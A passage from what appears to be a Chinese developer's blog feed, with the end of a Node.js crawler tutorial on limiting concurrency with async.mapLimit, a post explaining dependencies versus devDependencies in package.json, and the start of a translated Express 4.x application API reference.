$.<span class="keyword">get</span>('data',function(data)&#123;</span><br><span class="line">        result.data2 = data;</span><br><span class="line">        count++;</span><br><span class="line">        handle();</span><br><span class="line">    &#125;)</span><br><span class="line">    $.<span class="keyword">get</span>('l10n',function(data)&#123;</span><br><span class="line">        result.data3 = data;</span><br><span class="line">        count++;</span><br><span class="line">        handle();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(count === <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> html = fuck(result.data1,result.data2,result.data3);</span><br><span class="line">            render(html);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>在这里，enterproxy就可以起到这个计数器的作用，它帮你管理这些异步操作是否完成，完成之后，他会自动调用你提供的处理函数，并将抓取到数据当做参数传递过来</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ep = <span class="keyword">new</span> enterproxy();</span><br><span class="line">ep.all(<span class="string">'data_event1'</span>,<span class="string">'data_event2'</span>,<span class="string">'data_event3'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data1,data2,data3</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> html = fuck(data1,data2,data3);</span><br><span class="line">    render(html);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$.<span class="keyword">get</span>('http:example1',function(data)&#123;</span><br><span class="line">    ep.emit(<span class="string">'data_event1'</span>,data);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$.<span class="keyword">get</span>('http:example2',function(data)&#123;</span><br><span class="line">    ep.emit(<span class="string">'data_event2'</span>,data);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$.<span class="keyword">get</span>('http:example3',function(data)&#123;</span><br><span class="line">    ep.emit(<span class="string">'data_event3'</span>,data);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>enterproxy还提供了其他不少场景所需的API，可以自行学习下这个API <a href="https://github.com/JacksonTian/eventproxy" target="_blank" rel="noopener">enterproxy</a></p><h1 id="使用async控制并发数量"><a href="#使用async控制并发数量" class="headerlink" title="使用async控制并发数量"></a>使用async控制并发数量</h1><p>假如我们有40个请求需要发出，很多网站可能会因为你发出的并发连接数太多而当你是在恶意请求，把你的IP封掉。<br>所以我们总是需要控制并发数量，然后慢慢抓取完这40个链接。</p><p>使用async中mapLimit控制一次性并发数量为5，一次性只抓取5个链接。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span>.mapLimit(arr, <span class="number">5</span>, <span class="function"><span class="keyword">function</span> (<span class="params">url, callback</span>) </span>&#123;</span><br><span class="line">     <span class="comment">// something</span></span><br><span class="line">   &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error, result</span>) </span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">"result: "</span>)</span><br><span class="line">     <span class="built_in">console</span>.log(result);</span><br><span class="line">   &#125;)</span><br></pre></td></tr></table></figure><p>我们首先应该知道什么是<code>并发</code>，为什么需要限制并发数量，都有哪些处理方案。然后就可以去文档具体看一下API如何使用。<a href="https://caolan.github.io/async/" target="_blank" rel="noopener">async文档</a>可以很好的学习这些语法。</p><p>模拟一组数据，这里返回的数据是假的，返回的延时是随机的。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> concurreyCount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> fetchUrl = <span class="function"><span class="keyword">function</span>(<span class="params">url,callback</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// delay 的值在 2000 以内，是个随机的整数 模拟延时</span></span><br><span class="line">    <span class="keyword">var</span> delay =  <span class="built_in">parseInt</span>((<span class="built_in">Math</span>.random()* <span class="number">10000000</span>) % <span class="number">2000</span>,<span class="number">10</span>);</span><br><span class="line">    concurreyCount++;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'现在并发数是 '</span> , concurreyCount , <span class="string">' 正在抓取的是'</span> , url , <span class="string">' 耗时'</span> + delay + <span class="string">'毫秒'</span>);</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        concurreyCount--;</span><br><span class="line">        callback(<span class="literal">null</span>,url + <span class="string">' html content'</span>);</span><br><span class="line">    &#125;,delay);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> urls = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;<span class="number">30</span>;i++)&#123;</span><br><span class="line">    urls.push(<span class="string">'http://datasource_'</span> + i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们使用<code>async.mapLimit</code>来并发抓取，并获取结果。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span>.mapLimit(urls,<span class="number">5</span>,<span class="function"><span class="keyword">function</span>(<span class="params">url,callback</span>)</span>&#123;</span><br><span class="line">    fetchUrl(url,callbcak);</span><br><span class="line">&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err,result</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'result: '</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>模拟摘自<a href="https://github.com/alsotang/node-lessons/tree/master/lesson5" target="_blank" rel="noopener">alsotang</a></p><p>运行输出后得到以下结果</p><p><img src="http://www.chenqaq.com/assets/images/concurrency1.png" alt=""></p><p>我们发现，并发数从1开始增长，但是增长到5时，就不在增加。然有任务时就继续抓取，并发连接数量始终控制在5个。</p><h1 id="完成node简易爬虫系统"><a href="#完成node简易爬虫系统" class="headerlink" title="完成node简易爬虫系统"></a>完成node简易爬虫系统</h1><p>因为alsotang前辈的<a href="https://github.com/alsotang/node-lessons" target="_blank" rel="noopener">《node包教不包会》</a>教程例子中使用的eventproxy控制的并发数量，我们就来完成一个使用async控制并发数量的node简易爬虫。</p><p>爬取的目标就是<a href="http://www.chenqaq.com">本站首页</a>（手动护脸）</p><p>第一步，首先我们需要用到以下的模块：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">- url ： 用于url解析，这里用到<span class="string">`url.resolve()`</span>生成一个合法的域名</span><br><span class="line">- <span class="keyword">async</span> ： 一个实用的模块，提供了强大的功能和异步JavaScript工作</span><br><span class="line">- cheerio ： 为服务器特别定制的，快速，灵活，实施的jQuery核心实现</span><br><span class="line">- superagent ： nodejs里一个非常方便的客户端请求代理模块</span><br></pre></td></tr></table></figure><p>通过<code>npm</code>安装依赖模块</p><p><img src="http://www.chenqaq.com/assets/images/concurrency2.png" alt=""></p><p>第二步，通过require引入依赖模块，确定爬取对象URL：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="keyword">async</span> = <span class="built_in">require</span>(<span class="string">"async"</span>);</span><br><span class="line"><span class="keyword">var</span> cheerio = <span class="built_in">require</span>(<span class="string">"cheerio"</span>);</span><br><span class="line"><span class="keyword">var</span> superagent = <span class="built_in">require</span>(<span class="string">"superagent"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> baseUrl = <span class="string">'http://www.chenqaq.com'</span>;</span><br></pre></td></tr></table></figure><p>第三步：使用superagent请求目标URL，并使用cheerio处理baseUrl得到目标内容url，并保存在数组arr中</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">superagent.get(baseUrl)</span><br><span class="line">  .end(<span class="function"><span class="keyword">function</span> (<span class="params">err, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> arr = [];</span><br><span class="line">    <span class="keyword">var</span> $ = cheerio.load(res.text);</span><br><span class="line">    <span class="comment">// 下面和jQuery操作是一样一样的..</span></span><br><span class="line">    $(<span class="string">".post-list .post-title-link"</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params">idx, element</span>) </span>&#123;</span><br><span class="line">      $element = $(element);</span><br><span class="line">      <span class="keyword">var</span> _url = url.resolve(baseUrl, $element.attr(<span class="string">"href"</span>));</span><br><span class="line">      arr.push(_url);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证得到的所有文章链接集合</span></span><br><span class="line">    output(arr);</span><br><span class="line">    <span class="comment">// 第四步：接下来遍历arr，解析每一个页面需要的信息</span></span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>我们需要一个函数验证抓取的url对象，很简单我们只需要一个函数遍历arr并打印出来就可以：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第四步：我们需要遍历得到的URL对象，解析每一个页面需要的信息。</p><p>这里就需要用到<code>async</code>控制并发数量，如果你上一步获取了一个庞大的arr数组，有多个url需要请求，如果同时发出多个请求，一些网站就可能会把你的行为当做恶意请求而封掉你的ip</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span>.mapLimit(arr,<span class="number">3</span>,<span class="function"><span class="keyword">function</span>(<span class="params">url,callback</span>)</span>&#123;</span><br><span class="line">    superagent.get(url)</span><br><span class="line">        .end(<span class="function"><span class="keyword">function</span>(<span class="params">err,mes</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="built_in">console</span>.error(err);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'message info '</span> + <span class="built_in">JSON</span>.stringify(mes));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'「fetch」'</span> + url + <span class="string">' successful！'</span>);</span><br><span class="line">            <span class="keyword">var</span> $ = cheerio.load(mes.text);</span><br><span class="line">            <span class="keyword">var</span> jsonData = &#123;</span><br><span class="line">                title:$(<span class="string">'.post-card-title'</span>).text().trim(),</span><br><span class="line">                href: url,</span><br><span class="line">            &#125;;</span><br><span class="line">            callback(<span class="literal">null</span>,jsonData);</span><br><span class="line">        &#125;,<span class="function"><span class="keyword">function</span>(<span class="params">error,results</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'results '</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(results);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>得到上一步保存url地址的数组arr，限制最大并发数量为3，然后用一个回调函数处理 「该回调函数比较特殊，在iteratee方法中一定要调用该回调函数，有三种方式」</p><ul><li><code>callback(null)</code> 调用成功</li><li><code>callback(null，data)</code> 调用成功，并且返回数据data追加到results</li><li><code>callback(data)</code> 调用失败，不会再继续循环，直接到最后的callback</li></ul><p>好了，到这里我们的node简易的小爬虫就完成了，来看看效果吧</p><p><img src="http://www.chenqaq.com/assets/images/concurrency3.png" alt=""></p><p>首页数据好少，但是成功啦。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://github.com/alsotang/node-lessons" target="_blank" rel="noopener">Node.js 包教不包会 - alsotang</a></p><p><a href="https://github.com/JacksonTian/eventproxy" target="_blank" rel="noopener">enterproxy</a></p><p><a href="https://github.com/caolan/async" target="_blank" rel="noopener">async</a></p><p><a href="https://caolan.github.io/async" target="_blank" rel="noopener">async Documentation</a></p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>package.json的正确使用姿势</title>
      <link href="/2017/12/29/dependencies-devDependencies/"/>
      <url>/2017/12/29/dependencies-devDependencies/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>刀耕火种的时代已经过去，前端开发急需自动化，工程化。</p><p>有一天，你找到公司新人程序员小T和小F，给他们每个人分配了一个任务。小T和小F微笑的答应了，确定了项目的选型和结构，小T和小F准备安装依赖的模块。但是他们开始对于dependencies和devDependencies并没有那么在意：</p><a id="more"></a><p>程序员小T把所有的依赖模块都使用 <code>npm install --save</code>，将依赖安装在项目中，并写入了package.json的<code>dependencies</code>(生产环境)，最终导致项目臃肿不堪，前端是对性能的狂热追求者，最终小T的项目没有通过测试。 </p><p>程序员小F把所有的依赖模块使用<code>npm install --save-dev</code>,将依赖安装在项目中，并写入了package.json中的<code>devDependencies</code>(本地开发环境)，最终导致正常运行该项目使用了哪些依赖模块无从得知，预想后期会带来很多麻烦，导致小F的项目也没有通过测试</p><h1 id="安装依赖的三种方式"><a href="#安装依赖的三种方式" class="headerlink" title="安装依赖的三种方式"></a>安装依赖的三种方式</h1><p>小T和小F有些疑惑，项目本地明明正常，为什么都没有通过测试呢？他们决定弄个明白..</p><p>于是小T问，小F “你是怎么安装依赖的呀？” 小F：“我是使用<code>npm install --save-dev</code>安装依赖模块”，“哦，是这样呀，我是用npm install –save安装的模块”，小T答到。</p><ul><li>npm install </li><li>npm install –save</li><li>npm install –save-dev</li></ul><p>使用<code>npm install</code>将依赖模块安装到项目，但不写package.json（不推荐，这样最终需要手动添加）；使用<code>npm install --save</code>将模块安装到项目，写入的package.json的<code>dependencies</code>中；使用<code>npm install --save-dev</code>将模块安装到本地，写入package.json的<code>devDependencies</code>中。</p><p><img src="http://www.chenqaq.com/assets/images/dev1.png" alt="开发环境生产环境"></p><p>小T恍然大悟，原来是这样呀。那么前端工程化中的<code>开发环境</code>和<code>生产环境</code>到底有怎么样的区别呢？</p><h1 id="正确使用姿势"><a href="#正确使用姿势" class="headerlink" title="正确使用姿势"></a>正确使用姿势</h1><p>那么我们如何知道哪些是在生产环境中需要，哪些是在开发环境中需要呢?</p><p>生产环境只需要我们能正常运行该项目所需要的模块， 比如vue，vue-router，express，jQuery等等这些，项目没有这些依赖会出错</p><p>开发环境就是开发阶段，我们所做的单元测试，webpack，gulp，supervisor等这些工具，都只是在开发阶段需要，一旦项目投入需要便不再需要。</p><p>使用npm install 默认安装dependencies和devDependencies中的模块，如果只需要安装生产环境中的模块使用npm install -production</p><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><p>原来devDependencies里面的模块只用于开发环境，不用于生产环境，而 dependencies 是需要发布到生产环境的。那究竟有什么区别呢？工程化为什么需要这两个环境？</p><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>devDependencies中dev是develop的缩写，表示开发环境，即指开发阶段，对于一些仅在开发阶段需要的模块，项目正式投入后便不再需要的模块,我们选择把它们安装在<code>devDependencies</code>.</p><p>前端开发越来越体现工程化改革的姿态，无论是使用工具的进化，还是框架的更新迭代，前端对性能狂热追求伴随着工程化的进步也在不断提高，必然导致开发环境的多种多样，不可避免的导致开发环境的臃肿</p><h2 id="生产环境"><a href="#生产环境" class="headerlink" title="生产环境"></a>生产环境</h2><p>生产环境也就是真是真实环境,是线上用户接触的产生环境,因为开发环境的臃肿，不能直接用于生产环境，我们需要对环境可以优化的部分进行优化。</p><h2 id="判断是开发环境还是生产环境"><a href="#判断是开发环境还是生产环境" class="headerlink" title="判断是开发环境还是生产环境"></a>判断是开发环境还是生产环境</h2><ul><li>使用req.app.get(‘env’)</li></ul><p>举个栗子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// set locals, only providing error in development</span></span><br><span class="line">  res.locals.message = err.message;</span><br><span class="line">  res.locals.error = req.app.get(<span class="string">'env'</span>) === <span class="string">'development'</span> ? err : &#123;&#125;;</span><br><span class="line">  <span class="comment">// render the error page</span></span><br><span class="line">  res.status(err.status || <span class="number">500</span>);</span><br><span class="line">  res.render(<span class="string">'error'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="http://www.chenqaq.com/assets/images/env2.png" alt="req.app.get(&#39;env&#39;)"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://www.qdfuns.com/notes/25650/cb89922bcb597ca2cd13d5e61b180358.html" target="_blank" rel="noopener">qdfuns notes</a></p><p><a href="https://docs.npmjs.com/files/package.json" target="_blank" rel="noopener">npm package.json</a></p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Express4.x API (一)：application (译)</title>
      <link href="/2017/12/24/express-api-cn-application/"/>
      <url>/2017/12/24/express-api-cn-application/</url>
      
        <content type="html"><![CDATA[<h1 id="Express4-x-API-译文-系列文章"><a href="#Express4-x-API-译文-系列文章" class="headerlink" title="Express4.x API 译文 系列文章"></a>Express4.x API 译文 系列文章</h1><ul><li><a href="http://www.cnblogs.com/okaychen/p/8108405.html" target="_blank" rel="noopener">Express4.x API (一)：application (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8081275.html" target="_blank" rel="noopener">Express4.x API (二)：request (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8087425.html" target="_blank" rel="noopener">Express4.x API (三)：Response (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8093717.html" target="_blank" rel="noopener">Express4.x API (四)：router (译) – 完成</a></li></ul><p>技术库更迭较快，很难使译文和官方的API保持同步，更何况更多的大神看英文和中文一样的流畅，不会花时间去翻译–，所以我们看到<a href="http://www.expressjs.com.cn" target="_blank" rel="noopener">express中文网</a>更多的还是英文，我们只有提升自己的英语能力才能更快的适应库的更新迭代,阅读到最新资料.<br>所以我此次翻译的目的，一是熟悉express文档，二是锻炼自己英语阅读能力；</p><blockquote><p>原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#res" target="_blank" rel="noopener">express.com</a></p></blockquote><a id="more"></a><h1 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h1><p>app对象是指一个Express应用程序，通过调用的顶层的express()函数创造它</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'hello world'</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>app对象有以下这些方法</p><ul><li>路由HTTP请求；例如：app.METHOD和app.param</li><li>配置中间件；例如：app.router</li><li>渲染HTML视图；例如：app.render</li><li>注册模板引擎；例如：app.engine</li></ul><p>他还具有影响应用程序行为的设置(属性)；获得更多的信息，见<a href="http://www.expressjs.com.cn/4x/api.html#app.settings.table" target="_blank" rel="noopener">Application settings</a></p><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><h3 id="app-locals"><a href="#app-locals" class="headerlink" title="app.locals"></a>app.locals</h3><p>app.locals是一个JavaScript对象，它的属性是应用程序中的局部变量</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.locals.title  <span class="comment">// "My App"</span></span><br><span class="line"></span><br><span class="line">app.locals.email  <span class="comment">// "me@myapp.com"</span></span><br></pre></td></tr></table></figure><p>一旦设置，<code>app.locals</code>属性的值将会贯穿整个生命周期。对比<code>res.locals</code>属性的特性，<code>res.locals</code>仅适用于请求的生命周期</p><p>你可以访问应用程序中呈现的模板中的本地变量，这对于想模板提供协助函数以及<code>app-level</code>非常有用。但是请注意，您不能访问中间件的局部变量</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.locals.title = <span class="string">"My App"</span>;</span><br><span class="line">app.locals.strftime = <span class="built_in">require</span>(<span class="string">'strftime'</span>);</span><br><span class="line">app.locals.email = <span class="string">'me@myapp.com'</span>;</span><br></pre></td></tr></table></figure><h3 id="app-mountpath"><a href="#app-mountpath" class="headerlink" title="app.mountpath"></a>app.mountpath</h3><p>app.mountpath属性是路径模式的子应用程序安装</p><blockquote><p>子应用程序是一个Express实例，可以用于处理对路由的请求</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();  <span class="comment">// 主要的应用程序</span></span><br><span class="line"><span class="keyword">var</span> admin = express();  <span class="comment">// 子应用程序</span></span><br><span class="line"></span><br><span class="line">admin.get(<span class="string">'/'</span>，<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(admin.mountpath)  <span class="comment">// admin</span></span><br><span class="line">    res.send(<span class="string">'Admin Homepage'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/admin'</span>,admin) <span class="comment">// 挂载子应用程序</span></span><br></pre></td></tr></table></figure><p>这类似于req对象中的<code>baseUrl</code>属性，除了<code>baseUrl</code>返回匹配的URL路径，而不是匹配的模式(s).</p><p>如果子应用程序挂载在多个路径模式上，<code>app.mountpath</code>返回它挂载的模式列表，像下面所展示的例子这样：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> admin = express();</span><br><span class="line"></span><br><span class="line">admin.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(admin.mountpath)   <span class="comment">// [ '/adm*n','/manager' ]</span></span><br><span class="line">    res.send(<span class="string">'Admin Homepage'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> secret = express();</span><br><span class="line">secret.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(secret.mountpath); <span class="comment">//secr*t</span></span><br><span class="line">    res.send(<span class="string">'Admin Secret'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">admin.use(<span class="string">'/secr*t'</span>, secret); </span><br><span class="line">app.use([<span class="string">'/adm*n'</span>, <span class="string">'/manager'</span>], admin);</span><br></pre></td></tr></table></figure><h2 id="Events"><a href="#Events" class="headerlink" title="Events"></a>Events</h2><h3 id="app-on-‘mount’-callback-parent"><a href="#app-on-‘mount’-callback-parent" class="headerlink" title="app.on(‘mount’,callback(parent))"></a>app.on(‘mount’,callback(parent))</h3><p>当子程序被挂载到父程序时，mount事件被发射。父程序对象作为参数，传递给回调方法。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> admin = express();</span><br><span class="line"></span><br><span class="line">admin.on(<span class="string">'mount'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">parent</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Admin Mount'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(parent);   <span class="comment">// 指父应用程序</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">admin.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'Admin homePage'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/admin'</span>,admin);</span><br></pre></td></tr></table></figure><h2 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h2><h3 id="app-all-path-callback-callback-…"><a href="#app-all-path-callback-callback-…" class="headerlink" title="app.all(path,callback[,callback …])"></a>app.all(path,callback[,callback …])</h3><p>app.all方法和标准的app.METHOD()方法类似，除了它匹配所有的HTTP动词。对于给一个特殊前缀映射一个全局的逻辑处理，或者无条件匹配，它是很有效的。例如，如果你把下面内容放在所有其他的路由定义的前面，它要求所有从这个点开始的路由需要认证和自动加载一个用户。这些回调并不一定是终点：<code>loadUser</code>可以在完成了上一个任务后，调用<code>next()</code>来继续匹配随后的路由。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.all(<span class="string">'*'</span>,requireAuthentication,loadUser)</span><br></pre></td></tr></table></figure><p>或者这种相等的形式：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.all(<span class="string">'*'</span>,requireAuthentication);</span><br><span class="line">app.all(<span class="string">'*'</span>,loadUser)</span><br></pre></td></tr></table></figure><p>另一个例子是全局白名单的方法（white-listed “global” functionality）。这个例子和前面很像，然而它只是限制以/api开头的路径。</p><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">app.<span class="keyword">all</span>(<span class="string">'/api/*'</span>,requireAuthentication);</span><br></pre></td></tr></table></figure><h3 id="app-delete-path-callback-callback-…"><a href="#app-delete-path-callback-callback-…" class="headerlink" title="app.delete(path, callback [, callback …])"></a>app.delete(path, callback [, callback …])</h3><p>路由HTTP DELETE请求到有特殊回调方法的特殊的路径。获取更多的信息，可以查阅<a href="http://www.expressjs.com.cn/guide/routing.html" target="_blank" rel="noopener">routing guide</a></p><p>你可以提供多个回调函数，他们的作用和中间件一样，除了这些回调可以通过调用next(‘router’)来绕过剩余的路由回调。你可以使用这个机制来为一个路由设置一些前提条件，如果不能满足当前路由的处理条件，那么你可以传递控制到随后的路由。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.delete(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'DELETE request to homepage'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="app-disable-name"><a href="#app-disable-name" class="headerlink" title="app.disable(name)"></a>app.disable(name)</h3><p>将设置名为name的值为false，此处的name是<a href="http://www.expressjs.com.cn/4x/api.html#app.settings.table" target="_blank" rel="noopener">app settings table</a>中各属性的一个。调用app.set(‘foo’,false)和app.disable(‘foo’)是等价的</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.disable(<span class="string">'trust proxy'</span>);</span><br><span class="line">app.get(<span class="string">'trust proxy'</span>);   <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h3 id="app-disabled-name"><a href="#app-disabled-name" class="headerlink" title="app.disabled(name)"></a>app.disabled(name)</h3><p>如果<code>name</code>被禁用则返回true，此处的name是<a href="http://www.expressjs.com.cn/4x/api.html#app.settings.table" target="_blank" rel="noopener">app settings table</a>中各属性的一个</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.disabled(<span class="string">'trust proxy'</span>);  <span class="comment">// true</span></span><br><span class="line">app.enable(<span class="string">'trust proxy'</span>);</span><br><span class="line">app.disabled(<span class="string">'trust proxy'</span>);  <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h3 id="app-enable-name"><a href="#app-enable-name" class="headerlink" title="app.enable(name)"></a>app.enable(name)</h3><p>设置布尔类型的设置值name为true，此处的name是<a href="http://www.expressjs.com.cn/4x/api.html#app.settings.table" target="_blank" rel="noopener">app settings table</a>中各属性的一个。调用app.set(‘foo’, true)和调用app.enable(‘foo’)是等价的。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.enable(<span class="string">'trust proxy'</span>);</span><br><span class="line">app.get(<span class="string">'trust proxy'</span>)  <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="app-enabled-name"><a href="#app-enabled-name" class="headerlink" title="app.enabled(name)"></a>app.enabled(name)</h3><p>如果<code>name</code>可用则返回true，此处的name是<a href="http://www.expressjs.com.cn/4x/api.html#app.settings.table" target="_blank" rel="noopener">app settings table</a>中各属性的一个。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.enabled(<span class="string">'trust proxy'</span>)   <span class="comment">// false</span></span><br><span class="line">app.enable(<span class="string">'trust proxy'</span>)   </span><br><span class="line">app.enabled(<span class="string">'trust proxy'</span>)   <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="app-engine-ext-callback"><a href="#app-engine-ext-callback" class="headerlink" title="app.engine(ext,callback)"></a>app.engine(ext,callback)</h3><p>注册给定引擎的回调，用来渲染ext文件。默认情况下，Express需要使用require()来加载基于文件扩展的引擎。例如，如果你尝试渲染一个<code>foo.jade</code>文件，Express在内部调用下面内容，同时缓存<code>require()</code>结果供随后来调用去提高性能</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.engine(<span class="string">'jade'</span>,<span class="built_in">require</span>(<span class="string">'jade'</span>).__express);</span><br></pre></td></tr></table></figure><p>使用下面这种方法，来处理没有办法开箱即用的.express方法的模板，或者你希望使用不同的扩展名。</p><p>举个栗子，使用ejs模板引擎来渲染.html文件：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.engine(<span class="string">'html'</span>,<span 